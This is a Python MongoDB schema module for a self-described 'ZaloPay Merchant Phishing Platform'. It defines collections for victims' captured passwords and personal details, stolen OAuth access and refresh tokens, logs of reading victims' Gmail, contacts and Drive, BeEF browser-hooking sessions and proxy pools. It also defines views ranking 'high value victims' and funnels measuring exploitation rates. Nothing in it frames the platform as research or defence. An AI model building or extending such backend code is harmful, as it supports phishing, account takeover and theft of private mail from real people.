"""
Complete MongoDB Schema Implementation
All collections, indexes, and aggregation pipelines for the ZaloPay Merchant Phishing Platform
"""

import os
import json
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Union
import logging
from pymongo import MongoClient, ASCENDING, DESCENDING, TEXT
from pymongo.errors import DuplicateKeyError, OperationFailure
import pymongo

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MongoDBManager:
    """Complete MongoDB schema manager"""
    
    def __init__(self, connection_string: str = None, database_name: str = "zalopay_phishing"):
        self.connection_string = connection_string or os.getenv("MONGODB_URI", "mongodb://localhost:27017")
        self.database_name = database_name
        self.client = None
        self.db = None
        self.collections = {}
        
        # Initialize connection
        self._connect()
    
    def _connect(self):
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(self.connection_string)
            self.db = self.client[self.database_name]
            logger.info(f"Connected to MongoDB: {self.database_name}")
        except Exception as e:
            logger.error(f"Error connecting to MongoDB: {e}")
            raise
    
    def initialize_schema(self):
        """Initialize complete database schema"""
        try:
            # Create all collections
            self._create_victims_collection()
            self._create_oauth_tokens_collection()
            self._create_admin_users_collection()
            self._create_campaigns_collection()
            self._create_activity_logs_collection()
            self._create_gmail_access_logs_collection()
            self._create_beef_sessions_collection()
            self._create_conversion_events_collection()
            self._create_attribution_events_collection()
            self._create_proxy_pools_collection()
            self._create_system_metrics_collection()
            self._create_encryption_keys_collection()
            self._create_audit_logs_collection()
            
            # Create all indexes
            self._create_all_indexes()
            
            # Create views
            self._create_views()
            
            # Create aggregation pipelines
            self._create_aggregation_pipelines()
            
            logger.info("MongoDB schema initialization completed")
            
        except Exception as e:
            logger.error(f"Error initializing schema: {e}")
            raise
    
    def _create_victims_collection(self):
        """Create victims collection with complete schema"""
        try:
            collection = self.db.victims
            
            # Create collection with validation
            self.db.create_collection("victims", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["victim_id", "email", "created_at", "status"],
                    "properties": {
                        "victim_id": {"bsonType": "string"},
                        "email": {"bsonType": "string"},
                        "password": {"bsonType": "string"},
                        "first_name": {"bsonType": "string"},
                        "last_name": {"bsonType": "string"},
                        "phone": {"bsonType": "string"},
                        "company": {"bsonType": "string"},
                        "job_title": {"bsonType": "string"},
                        "country": {"bsonType": "string"},
                        "city": {"bsonType": "string"},
                        "ip_address": {"bsonType": "string"},
                        "user_agent": {"bsonType": "string"},
                        "device_type": {"bsonType": "string"},
                        "browser": {"bsonType": "string"},
                        "os": {"bsonType": "string"},
                        "screen_resolution": {"bsonType": "string"},
                        "timezone": {"bsonType": "string"},
                        "language": {"bsonType": "string"},
                        "status": {"enum": ["active", "inactive", "banned", "deleted"]},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "last_seen": {"bsonType": "date"},
                        "campaign_id": {"bsonType": "string"},
                        "session_id": {"bsonType": "string"},
                        "fingerprint": {"bsonType": "object"},
                        "business_intelligence": {"bsonType": "object"},
                        "intelligence_score": {"bsonType": "number"},
                        "risk_level": {"enum": ["low", "medium", "high", "critical"]},
                        "exploitation_status": {"bsonType": "object"},
                        "tags": {"bsonType": "array"},
                        "notes": {"bsonType": "string"},
                        "encrypted_data": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["victims"] = collection
            logger.info("Victims collection created")
            
        except Exception as e:
            logger.error(f"Error creating victims collection: {e}")
            raise
    
    def _create_oauth_tokens_collection(self):
        """Create OAuth tokens collection"""
        try:
            collection = self.db.oauth_tokens
            
            self.db.create_collection("oauth_tokens", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["token_id", "victim_id", "provider", "access_token", "created_at"],
                    "properties": {
                        "token_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "provider": {"enum": ["google", "apple", "facebook", "microsoft"]},
                        "access_token": {"bsonType": "string"},
                        "refresh_token": {"bsonType": "string"},
                        "id_token": {"bsonType": "string"},
                        "token_type": {"bsonType": "string"},
                        "expires_at": {"bsonType": "date"},
                        "scope": {"bsonType": "array"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "last_used": {"bsonType": "date"},
                        "is_valid": {"bsonType": "bool"},
                        "encrypted_token": {"bsonType": "string"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["oauth_tokens"] = collection
            logger.info("OAuth tokens collection created")
            
        except Exception as e:
            logger.error(f"Error creating OAuth tokens collection: {e}")
            raise
    
    def _create_admin_users_collection(self):
        """Create admin users collection"""
        try:
            collection = self.db.admin_users
            
            self.db.create_collection("admin_users", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["admin_id", "username", "email", "password_hash", "role", "created_at"],
                    "properties": {
                        "admin_id": {"bsonType": "string"},
                        "username": {"bsonType": "string"},
                        "email": {"bsonType": "string"},
                        "password_hash": {"bsonType": "string"},
                        "role": {"enum": ["super_admin", "admin", "operator", "viewer"]},
                        "permissions": {"bsonType": "array"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "last_login": {"bsonType": "date"},
                        "is_active": {"bsonType": "bool"},
                        "two_factor_enabled": {"bsonType": "bool"},
                        "two_factor_secret": {"bsonType": "string"},
                        "session_tokens": {"bsonType": "array"},
                        "profile": {"bsonType": "object"},
                        "preferences": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["admin_users"] = collection
            logger.info("Admin users collection created")
            
        except Exception as e:
            logger.error(f"Error creating admin users collection: {e}")
            raise
    
    def _create_campaigns_collection(self):
        """Create campaigns collection"""
        try:
            collection = self.db.campaigns
            
            self.db.create_collection("campaigns", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["campaign_id", "name", "campaign_type", "status", "created_by", "created_at"],
                    "properties": {
                        "campaign_id": {"bsonType": "string"},
                        "name": {"bsonType": "string"},
                        "description": {"bsonType": "string"},
                        "campaign_type": {"enum": ["phishing_email", "oauth_capture", "credential_harvest", "beef_exploitation", "comprehensive"]},
                        "status": {"enum": ["draft", "scheduled", "active", "paused", "completed", "cancelled", "failed"]},
                        "created_by": {"bsonType": "string"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "targeting": {"bsonType": "object"},
                        "content": {"bsonType": "object"},
                        "delivery": {"bsonType": "object"},
                        "analytics": {"bsonType": "object"},
                        "budget_limit": {"bsonType": "number"},
                        "success_criteria": {"bsonType": "object"},
                        "failure_thresholds": {"bsonType": "object"},
                        "auto_pause_conditions": {"bsonType": "array"},
                        "auto_complete_conditions": {"bsonType": "array"},
                        "tags": {"bsonType": "array"},
                        "notes": {"bsonType": "string"},
                        "version": {"bsonType": "int"},
                        "parent_campaign_id": {"bsonType": "string"},
                        "cloned_from": {"bsonType": "string"}
                    }
                }
            })
            
            self.collections["campaigns"] = collection
            logger.info("Campaigns collection created")
            
        except Exception as e:
            logger.error(f"Error creating campaigns collection: {e}")
            raise
    
    def _create_activity_logs_collection(self):
        """Create activity logs collection"""
        try:
            collection = self.db.activity_logs
            
            self.db.create_collection("activity_logs", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["log_id", "action", "timestamp", "source"],
                    "properties": {
                        "log_id": {"bsonType": "string"},
                        "action": {"bsonType": "string"},
                        "timestamp": {"bsonType": "date"},
                        "source": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "campaign_id": {"bsonType": "string"},
                        "admin_id": {"bsonType": "string"},
                        "session_id": {"bsonType": "string"},
                        "ip_address": {"bsonType": "string"},
                        "user_agent": {"bsonType": "string"},
                        "details": {"bsonType": "object"},
                        "severity": {"enum": ["info", "warning", "error", "critical"]},
                        "category": {"bsonType": "string"},
                        "tags": {"bsonType": "array"},
                        "encrypted_data": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["activity_logs"] = collection
            logger.info("Activity logs collection created")
            
        except Exception as e:
            logger.error(f"Error creating activity logs collection: {e}")
            raise
    
    def _create_gmail_access_logs_collection(self):
        """Create Gmail access logs collection"""
        try:
            collection = self.db.gmail_access_logs
            
            self.db.create_collection("gmail_access_logs", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["log_id", "victim_id", "access_type", "timestamp"],
                    "properties": {
                        "log_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "access_type": {"enum": ["email_read", "contact_access", "calendar_access", "drive_access", "profile_access"]},
                        "timestamp": {"bsonType": "date"},
                        "oauth_token_id": {"bsonType": "string"},
                        "proxy_id": {"bsonType": "string"},
                        "admin_id": {"bsonType": "string"},
                        "success": {"bsonType": "bool"},
                        "error_message": {"bsonType": "string"},
                        "data_extracted": {"bsonType": "object"},
                        "emails_processed": {"bsonType": "int"},
                        "contacts_found": {"bsonType": "int"},
                        "attachments_downloaded": {"bsonType": "int"},
                        "duration_seconds": {"bsonType": "number"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["gmail_access_logs"] = collection
            logger.info("Gmail access logs collection created")
            
        except Exception as e:
            logger.error(f"Error creating Gmail access logs collection: {e}")
            raise
    
    def _create_beef_sessions_collection(self):
        """Create BeEF sessions collection"""
        try:
            collection = self.db.beef_sessions
            
            self.db.create_collection("beef_sessions", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["session_id", "victim_id", "browser_info", "created_at"],
                    "properties": {
                        "session_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "browser_info": {"bsonType": "object"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "last_seen": {"bsonType": "date"},
                        "status": {"enum": ["active", "inactive", "expired", "killed"]},
                        "commands_executed": {"bsonType": "array"},
                        "capabilities": {"bsonType": "array"},
                        "vulnerabilities": {"bsonType": "array"},
                        "exploitation_phase": {"bsonType": "string"},
                        "success_rate": {"bsonType": "number"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["beef_sessions"] = collection
            logger.info("BeEF sessions collection created")
            
        except Exception as e:
            logger.error(f"Error creating BeEF sessions collection: {e}")
            raise
    
    def _create_conversion_events_collection(self):
        """Create conversion events collection"""
        try:
            collection = self.db.conversion_events
            
            self.db.create_collection("conversion_events", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["event_id", "campaign_id", "victim_id", "event_type", "timestamp"],
                    "properties": {
                        "event_id": {"bsonType": "string"},
                        "campaign_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "event_type": {"bsonType": "string"},
                        "timestamp": {"bsonType": "date"},
                        "value": {"bsonType": "number"},
                        "metadata": {"bsonType": "object"},
                        "source": {"bsonType": "string"},
                        "path_id": {"bsonType": "string"},
                        "path_length": {"bsonType": "int"},
                        "time_to_conversion": {"bsonType": "number"},
                        "touchpoints": {"bsonType": "array"}
                    }
                }
            })
            
            self.collections["conversion_events"] = collection
            logger.info("Conversion events collection created")
            
        except Exception as e:
            logger.error(f"Error creating conversion events collection: {e}")
            raise
    
    def _create_attribution_events_collection(self):
        """Create attribution events collection"""
        try:
            collection = self.db.attribution_events
            
            self.db.create_collection("attribution_events", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["event_id", "campaign_id", "victim_id", "touchpoint", "timestamp"],
                    "properties": {
                        "event_id": {"bsonType": "string"},
                        "campaign_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "touchpoint": {"bsonType": "string"},
                        "timestamp": {"bsonType": "date"},
                        "session_id": {"bsonType": "string"},
                        "attribution_data": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["attribution_events"] = collection
            logger.info("Attribution events collection created")
            
        except Exception as e:
            logger.error(f"Error creating attribution events collection: {e}")
            raise
    
    def _create_proxy_pools_collection(self):
        """Create proxy pools collection"""
        try:
            collection = self.db.proxy_pools
            
            self.db.create_collection("proxy_pools", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["proxy_id", "proxy_type", "host", "port", "created_at"],
                    "properties": {
                        "proxy_id": {"bsonType": "string"},
                        "proxy_type": {"enum": ["socks5", "http", "https"]},
                        "host": {"bsonType": "string"},
                        "port": {"bsonType": "int"},
                        "username": {"bsonType": "string"},
                        "password": {"bsonType": "string"},
                        "country": {"bsonType": "string"},
                        "city": {"bsonType": "string"},
                        "provider": {"bsonType": "string"},
                        "is_active": {"bsonType": "bool"},
                        "health_score": {"bsonType": "number"},
                        "last_used": {"bsonType": "date"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["proxy_pools"] = collection
            logger.info("Proxy pools collection created")
            
        except Exception as e:
            logger.error(f"Error creating proxy pools collection: {e}")
            raise
    
    def _create_system_metrics_collection(self):
        """Create system metrics collection"""
        try:
            collection = self.db.system_metrics
            
            self.db.create_collection("system_metrics", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["metric_id", "metric_name", "value", "timestamp"],
                    "properties": {
                        "metric_id": {"bsonType": "string"},
                        "metric_name": {"bsonType": "string"},
                        "value": {"bsonType": "number"},
                        "timestamp": {"bsonType": "date"},
                        "category": {"bsonType": "string"},
                        "tags": {"bsonType": "object"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["system_metrics"] = collection
            logger.info("System metrics collection created")
            
        except Exception as e:
            logger.error(f"Error creating system metrics collection: {e}")
            raise
    
    def _create_encryption_keys_collection(self):
        """Create encryption keys collection"""
        try:
            collection = self.db.encryption_keys
            
            self.db.create_collection("encryption_keys", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["key_id", "key_type", "encrypted_key", "created_at"],
                    "properties": {
                        "key_id": {"bsonType": "string"},
                        "key_type": {"enum": ["aes", "rsa", "hmac"]},
                        "encrypted_key": {"bsonType": "string"},
                        "created_at": {"bsonType": "date"},
                        "expires_at": {"bsonType": "date"},
                        "is_active": {"bsonType": "bool"},
                        "usage_count": {"bsonType": "int"},
                        "last_used": {"bsonType": "date"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["encryption_keys"] = collection
            logger.info("Encryption keys collection created")
            
        except Exception as e:
            logger.error(f"Error creating encryption keys collection: {e}")
            raise
    
    def _create_audit_logs_collection(self):
        """Create audit logs collection"""
        try:
            collection = self.db.audit_logs
            
            self.db.create_collection("audit_logs", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["audit_id", "action", "timestamp", "admin_id"],
                    "properties": {
                        "audit_id": {"bsonType": "string"},
                        "action": {"bsonType": "string"},
                        "timestamp": {"bsonType": "date"},
                        "admin_id": {"bsonType": "string"},
                        "resource_type": {"bsonType": "string"},
                        "resource_id": {"bsonType": "string"},
                        "old_values": {"bsonType": "object"},
                        "new_values": {"bsonType": "object"},
                        "ip_address": {"bsonType": "string"},
                        "user_agent": {"bsonType": "string"},
                        "severity": {"enum": ["low", "medium", "high", "critical"]},
                        "category": {"bsonType": "string"},
                        "description": {"bsonType": "string"},
                        "metadata": {"bsonType": "object"}
                    }
                }
            })
            
            self.collections["audit_logs"] = collection
            logger.info("Audit logs collection created")
            
        except Exception as e:
            logger.error(f"Error creating audit logs collection: {e}")
            raise
    
    def _create_all_indexes(self):
        """Create all indexes for optimal performance"""
        try:
            # Victims collection indexes
            self.collections["victims"].create_index("victim_id", unique=True)
            self.collections["victims"].create_index("email")
            self.collections["victims"].create_index("campaign_id")
            self.collections["victims"].create_index("status")
            self.collections["victims"].create_index("created_at")
            self.collections["victims"].create_index("country")
            self.collections["victims"].create_index("risk_level")
            self.collections["victims"].create_index([("campaign_id", 1), ("status", 1)])
            self.collections["victims"].create_index([("created_at", -1), ("status", 1)])
            self.collections["victims"].create_index([("country", 1), ("risk_level", 1)])
            self.collections["victims"].create_index("intelligence_score")
            self.collections["victims"].create_index("tags")
            self.collections["victims"].create_index([("email", "text"), ("first_name", "text"), ("last_name", "text")])
            
            # OAuth tokens collection indexes
            self.collections["oauth_tokens"].create_index("token_id", unique=True)
            self.collections["oauth_tokens"].create_index("victim_id")
            self.collections["oauth_tokens"].create_index("provider")
            self.collections["oauth_tokens"].create_index("is_valid")
            self.collections["oauth_tokens"].create_index("expires_at")
            self.collections["oauth_tokens"].create_index([("victim_id", 1), ("provider", 1)])
            self.collections["oauth_tokens"].create_index([("is_valid", 1), ("expires_at", 1)])
            
            # Admin users collection indexes
            self.collections["admin_users"].create_index("admin_id", unique=True)
            self.collections["admin_users"].create_index("username", unique=True)
            self.collections["admin_users"].create_index("email", unique=True)
            self.collections["admin_users"].create_index("role")
            self.collections["admin_users"].create_index("is_active")
            self.collections["admin_users"].create_index("last_login")
            
            # Campaigns collection indexes
            self.collections["campaigns"].create_index("campaign_id", unique=True)
            self.collections["campaigns"].create_index("created_by")
            self.collections["campaigns"].create_index("status")
            self.collections["campaigns"].create_index("campaign_type")
            self.collections["campaigns"].create_index("created_at")
            self.collections["campaigns"].create_index([("created_by", 1), ("status", 1)])
            self.collections["campaigns"].create_index([("status", 1), ("created_at", -1)])
            self.collections["campaigns"].create_index("tags")
            self.collections["campaigns"].create_index([("name", "text"), ("description", "text")])
            
            # Activity logs collection indexes
            self.collections["activity_logs"].create_index("log_id", unique=True)
            self.collections["activity_logs"].create_index("timestamp")
            self.collections["activity_logs"].create_index("action")
            self.collections["activity_logs"].create_index("source")
            self.collections["activity_logs"].create_index("victim_id")
            self.collections["activity_logs"].create_index("campaign_id")
            self.collections["activity_logs"].create_index("admin_id")
            self.collections["activity_logs"].create_index("severity")
            self.collections["activity_logs"].create_index([("timestamp", -1), ("severity", 1)])
            self.collections["activity_logs"].create_index([("victim_id", 1), ("timestamp", -1)])
            self.collections["activity_logs"].create_index([("campaign_id", 1), ("timestamp", -1)])
            
            # Gmail access logs collection indexes
            self.collections["gmail_access_logs"].create_index("log_id", unique=True)
            self.collections["gmail_access_logs"].create_index("victim_id")
            self.collections["gmail_access_logs"].create_index("access_type")
            self.collections["gmail_access_logs"].create_index("timestamp")
            self.collections["gmail_access_logs"].create_index("success")
            self.collections["gmail_access_logs"].create_index([("victim_id", 1), ("timestamp", -1)])
            self.collections["gmail_access_logs"].create_index([("access_type", 1), ("success", 1)])
            
            # BeEF sessions collection indexes
            self.collections["beef_sessions"].create_index("session_id", unique=True)
            self.collections["beef_sessions"].create_index("victim_id")
            self.collections["beef_sessions"].create_index("status")
            self.collections["beef_sessions"].create_index("created_at")
            self.collections["beef_sessions"].create_index("last_seen")
            self.collections["beef_sessions"].create_index([("victim_id", 1), ("status", 1)])
            self.collections["beef_sessions"].create_index([("status", 1), ("last_seen", -1)])
            
            # Conversion events collection indexes
            self.collections["conversion_events"].create_index("event_id", unique=True)
            self.collections["conversion_events"].create_index("campaign_id")
            self.collections["conversion_events"].create_index("victim_id")
            self.collections["conversion_events"].create_index("event_type")
            self.collections["conversion_events"].create_index("timestamp")
            self.collections["conversion_events"].create_index([("campaign_id", 1), ("timestamp", -1)])
            self.collections["conversion_events"].create_index([("victim_id", 1), ("event_type", 1)])
            
            # Attribution events collection indexes
            self.collections["attribution_events"].create_index("event_id", unique=True)
            self.collections["attribution_events"].create_index("campaign_id")
            self.collections["attribution_events"].create_index("victim_id")
            self.collections["attribution_events"].create_index("touchpoint")
            self.collections["attribution_events"].create_index("timestamp")
            self.collections["attribution_events"].create_index("session_id")
            self.collections["attribution_events"].create_index([("campaign_id", 1), ("victim_id", 1)])
            self.collections["attribution_events"].create_index([("session_id", 1), ("timestamp", -1)])
            
            # Proxy pools collection indexes
            self.collections["proxy_pools"].create_index("proxy_id", unique=True)
            self.collections["proxy_pools"].create_index("country")
            self.collections["proxy_pools"].create_index("is_active")
            self.collections["proxy_pools"].create_index("health_score")
            self.collections["proxy_pools"].create_index([("country", 1), ("is_active", 1)])
            self.collections["proxy_pools"].create_index([("is_active", 1), ("health_score", -1)])
            
            # System metrics collection indexes
            self.collections["system_metrics"].create_index("metric_id", unique=True)
            self.collections["system_metrics"].create_index("metric_name")
            self.collections["system_metrics"].create_index("timestamp")
            self.collections["system_metrics"].create_index("category")
            self.collections["system_metrics"].create_index([("metric_name", 1), ("timestamp", -1)])
            self.collections["system_metrics"].create_index([("category", 1), ("timestamp", -1)])
            
            # Encryption keys collection indexes
            self.collections["encryption_keys"].create_index("key_id", unique=True)
            self.collections["encryption_keys"].create_index("key_type")
            self.collections["encryption_keys"].create_index("is_active")
            self.collections["encryption_keys"].create_index("expires_at")
            self.collections["encryption_keys"].create_index([("key_type", 1), ("is_active", 1)])
            
            # Audit logs collection indexes
            self.collections["audit_logs"].create_index("audit_id", unique=True)
            self.collections["audit_logs"].create_index("timestamp")
            self.collections["audit_logs"].create_index("admin_id")
            self.collections["audit_logs"].create_index("action")
            self.collections["audit_logs"].create_index("severity")
            self.collections["audit_logs"].create_index([("admin_id", 1), ("timestamp", -1)])
            self.collections["audit_logs"].create_index([("action", 1), ("timestamp", -1)])
            self.collections["audit_logs"].create_index([("severity", 1), ("timestamp", -1)])
            
            # TTL indexes for auto-cleanup
            self.collections["activity_logs"].create_index("timestamp", expireAfterSeconds=90*24*3600)  # 90 days
            self.collections["system_metrics"].create_index("timestamp", expireAfterSeconds=30*24*3600)  # 30 days
            self.collections["attribution_events"].create_index("timestamp", expireAfterSeconds=60*24*3600)  # 60 days
            
            logger.info("All indexes created successfully")
            
        except Exception as e:
            logger.error(f"Error creating indexes: {e}")
            raise
    
    def _create_views(self):
        """Create database views for common queries"""
        try:
            # High-value victims view
            self.db.create_collection("high_value_victims", viewOn="victims", pipeline=[
                {"$match": {"intelligence_score": {"$gte": 80}}},
                {"$project": {
                    "victim_id": 1,
                    "email": 1,
                    "company": 1,
                    "job_title": 1,
                    "intelligence_score": 1,
                    "risk_level": 1,
                    "created_at": 1
                }}
            ])
            
            # Active campaigns view
            self.db.create_collection("active_campaigns", viewOn="campaigns", pipeline=[
                {"$match": {"status": {"$in": ["active", "scheduled"]}}},
                {"$project": {
                    "campaign_id": 1,
                    "name": 1,
                    "campaign_type": 1,
                    "status": 1,
                    "created_at": 1,
                    "targeting": 1
                }}
            ])
            
            # Recent activity view
            self.db.create_collection("recent_activity", viewOn="activity_logs", pipeline=[
                {"$match": {"timestamp": {"$gte": datetime.now(timezone.utc) - timedelta(days=7)}}},
                {"$sort": {"timestamp": -1}},
                {"$limit": 1000}
            ])
            
            # Campaign performance view
            self.db.create_collection("campaign_performance", viewOn="conversion_events", pipeline=[
                {"$group": {
                    "_id": "$campaign_id",
                    "total_conversions": {"$sum": 1},
                    "total_value": {"$sum": "$value"},
                    "avg_value": {"$avg": "$value"},
                    "last_conversion": {"$max": "$timestamp"}
                }},
                {"$lookup": {
                    "from": "campaigns",
                    "localField": "_id",
                    "foreignField": "campaign_id",
                    "as": "campaign_info"
                }},
                {"$unwind": "$campaign_info"},
                {"$project": {
                    "campaign_id": "$_id",
                    "campaign_name": "$campaign_info.name",
                    "total_conversions": 1,
                    "total_value": 1,
                    "avg_value": 1,
                    "last_conversion": 1
                }}
            ])
            
            logger.info("Database views created successfully")
            
        except Exception as e:
            logger.error(f"Error creating views: {e}")
            raise
    
    def _create_aggregation_pipelines(self):
        """Create common aggregation pipelines"""
        try:
            # Store aggregation pipelines in a collection
            pipelines_collection = self.db.aggregation_pipelines
            
            # Victim analytics pipeline
            victim_analytics_pipeline = [
                {"$group": {
                    "_id": {
                        "country": "$country",
                        "risk_level": "$risk_level"
                    },
                    "count": {"$sum": 1},
                    "avg_intelligence_score": {"$avg": "$intelligence_score"},
                    "high_value_count": {
                        "$sum": {"$cond": [{"$gte": ["$intelligence_score", 80]}, 1, 0]}
                    }
                }},
                {"$sort": {"count": -1}}
            ]
            
            # Campaign conversion funnel pipeline
            conversion_funnel_pipeline = [
                {"$match": {"campaign_id": {"$exists": True}}},
                {"$group": {
                    "_id": "$campaign_id",
                    "total_victims": {"$sum": 1},
                    "conversions": {
                        "$sum": {"$cond": [{"$ne": ["$exploitation_status", None]}, 1, 0]}
                    }
                }},
                {"$addFields": {
                    "conversion_rate": {
                        "$multiply": [
                            {"$divide": ["$conversions", "$total_victims"]},
                            100
                        ]
                    }
                }},
                {"$lookup": {
                    "from": "campaigns",
                    "localField": "_id",
                    "foreignField": "campaign_id",
                    "as": "campaign_info"
                }},
                {"$unwind": "$campaign_info"},
                {"$project": {
                    "campaign_id": "$_id",
                    "campaign_name": "$campaign_info.name",
                    "total_victims": 1,
                    "conversions": 1,
                    "conversion_rate": 1
                }}
            ]
            
            # Gmail access statistics pipeline
            gmail_stats_pipeline = [
                {"$group": {
                    "_id": {
                        "access_type": "$access_type",
                        "success": "$success"
                    },
                    "count": {"$sum": 1},
                    "avg_duration": {"$avg": "$duration_seconds"},
                    "total_emails": {"$sum": "$emails_processed"},
                    "total_contacts": {"$sum": "$contacts_found"}
                }},
                {"$sort": {"count": -1}}
            ]
            
            # System performance pipeline
            system_performance_pipeline = [
                {"$match": {
                    "metric_name": {"$in": ["cpu_usage", "memory_usage", "disk_usage", "response_time"]},
                    "timestamp": {"$gte": datetime.now(timezone.utc) - timedelta(hours=24)}
                }},
                {"$group": {
                    "_id": "$metric_name",
                    "avg_value": {"$avg": "$value"},
                    "max_value": {"$max": "$value"},
                    "min_value": {"$min": "$value"},
                    "latest_value": {"$last": "$value"}
                }},
                {"$sort": {"_id": 1}}
            ]
            
            # Store pipelines
            pipelines = [
                {
                    "pipeline_id": "victim_analytics",
                    "name": "Victim Analytics",
                    "description": "Analyze victim distribution and intelligence scores",
                    "pipeline": victim_analytics_pipeline,
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "pipeline_id": "conversion_funnel",
                    "name": "Campaign Conversion Funnel",
                    "description": "Calculate conversion rates for campaigns",
                    "pipeline": conversion_funnel_pipeline,
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "pipeline_id": "gmail_stats",
                    "name": "Gmail Access Statistics",
                    "description": "Analyze Gmail access patterns and success rates",
                    "pipeline": gmail_stats_pipeline,
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "pipeline_id": "system_performance",
                    "name": "System Performance Metrics",
                    "description": "Analyze system performance over time",
                    "pipeline": system_performance_pipeline,
                    "created_at": datetime.now(timezone.utc)
                }
            ]
            
            for pipeline in pipelines:
                pipelines_collection.replace_one(
                    {"pipeline_id": pipeline["pipeline_id"]},
                    pipeline,
                    upsert=True
                )
            
            logger.info("Aggregation pipelines created successfully")
            
        except Exception as e:
            logger.error(f"Error creating aggregation pipelines: {e}")
            raise
    
    def get_collection(self, collection_name: str):
        """Get a collection by name"""
        return self.collections.get(collection_name)
    
    def execute_aggregation(self, collection_name: str, pipeline_id: str, **kwargs):
        """Execute a stored aggregation pipeline"""
        try:
            collection = self.get_collection(collection_name)
            if not collection:
                raise ValueError(f"Collection {collection_name} not found")
            
            # Get pipeline from stored pipelines
            pipeline_doc = self.db.aggregation_pipelines.find_one({"pipeline_id": pipeline_id})
            if not pipeline_doc:
                raise ValueError(f"Pipeline {pipeline_id} not found")
            
            pipeline = pipeline_doc["pipeline"]
            
            # Replace placeholders with actual values
            for key, value in kwargs.items():
                pipeline = self._replace_pipeline_placeholders(pipeline, key, value)
            
            result = list(collection.aggregate(pipeline))
            return result
            
        except Exception as e:
            logger.error(f"Error executing aggregation: {e}")
            raise
    
    def _replace_pipeline_placeholders(self, pipeline: List[Dict], key: str, value: Any) -> List[Dict]:
        """Replace placeholders in aggregation pipeline"""
        import json
        pipeline_str = json.dumps(pipeline)
        pipeline_str = pipeline_str.replace(f"${key}", str(value))
        return json.loads(pipeline_str)
    
    def get_database_stats(self) -> Dict[str, Any]:
        """Get database statistics"""
        try:
            stats = {
                "database_name": self.database_name,
                "collections": {},
                "total_documents": 0,
                "total_size": 0
            }
            
            for collection_name, collection in self.collections.items():
                try:
                    count = collection.count_documents({})
                    size = collection.estimated_document_count()
                    
                    stats["collections"][collection_name] = {
                        "document_count": count,
                        "estimated_size": size
                    }
                    stats["total_documents"] += count
                    
                except Exception as e:
                    logger.warning(f"Error getting stats for {collection_name}: {e}")
                    stats["collections"][collection_name] = {
                        "document_count": 0,
                        "estimated_size": 0,
                        "error": str(e)
                    }
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting database stats: {e}")
            return {}
    
    def close(self):
        """Close database connection"""
        if self.client:
            self.client.close()
            logger.info("MongoDB connection closed")

# Global MongoDB manager instance
mongodb_manager = None

def initialize_mongodb_schema(connection_string: str = None, database_name: str = "zalopay_phishing") -> MongoDBManager:
    """Initialize MongoDB schema"""
    global mongodb_manager
    mongodb_manager = MongoDBManager(connection_string, database_name)
    mongodb_manager.initialize_schema()
    return mongodb_manager

def get_mongodb_manager() -> MongoDBManager:
    """Get MongoDB manager instance"""
    global mongodb_manager
    if mongodb_manager is None:
        mongodb_manager = MongoDBManager()
    return mongodb_manager
